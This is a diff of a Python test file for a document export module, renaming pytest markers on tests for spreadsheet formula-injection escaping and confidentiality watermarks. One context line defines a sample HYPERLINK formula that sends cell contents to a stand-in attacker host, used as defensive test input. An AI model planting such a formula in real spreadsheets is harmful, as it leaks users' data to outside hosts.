@@ -30,13 +30,13 @@ HYPERLINK = '=HYPERLINK("http://evil.example/?d="&A1;"Нажмите")'
 MARK = Mark("Иванов Иван", datetime(2026, 11, 6, 9, 30, tzinfo=UTC), "Europe/Moscow")
 
 
-@pytest.mark.spec("TC-SEC-05")
+@pytest.mark.tc("TC-SEC-05")
 @pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
 def test_every_formula_prefix_is_escaped(prefix: str) -> None:
     assert escape_text(prefix + "1+1") == "'" + prefix + "1+1"
 
 
-@pytest.mark.spec("TC-SEC-05")
+@pytest.mark.tc("TC-SEC-05")
 def test_hyperlink_and_plain_text() -> None:
     assert escape_text(HYPERLINK) == "'" + HYPERLINK
     assert escape_text("Бэкенд = API") == "Бэкенд = API"
@@ -53,7 +53,7 @@ def _xlsx(workbook: Workbook) -> bytes:
     return buffer.getvalue()
 
 
-@pytest.mark.spec("TC-SEC-05")
+@pytest.mark.tc("TC-SEC-05")
 def test_xlsx_has_values_not_formulas() -> None:
     workbook = Workbook()
     write_row(workbook.active, 5, [HYPERLINK, "@SUM(A1)", Decimal("12.5"), 3, None, "текст"])
@@ -86,7 +86,7 @@ def test_csv_bom_comment_and_rfc4180() -> None:
 
 
 @pytest.mark.spec("FR-EXP-06")
-@pytest.mark.spec("TC-SEC-09")
+@pytest.mark.tc("TC-SEC-09")
 def test_mark_text_in_user_timezone() -> None:
     assert MARK.text == "Коммерческая тайна · Иванов Иван · 06.11.2026 12:30"
     naive = Mark("П", datetime(2026, 1, 1, 0, 0), "Asia/Novosibirsk")
@@ -94,7 +94,7 @@ def test_mark_text_in_user_timezone() -> None:
 
 
 @pytest.mark.spec("FR-EXP-06")
-@pytest.mark.spec("TC-SEC-09")
+@pytest.mark.tc("TC-SEC-09")
 def test_xlsx_marks_on_every_sheet_and_first_rows() -> None:
     workbook = Workbook()
     workbook.create_sheet("Допущения и риски")
@@ -116,7 +116,7 @@ def test_xlsx_marks_on_every_sheet_and_first_rows() -> None:
 
 
 @pytest.mark.spec("FR-EXP-06")
-@pytest.mark.spec("TC-SEC-09")
+@pytest.mark.tc("TC-SEC-09")
 def test_docx_marks_in_every_section_and_first_paragraph() -> None:
     document = Document()
     document.add_paragraph("Допущения")
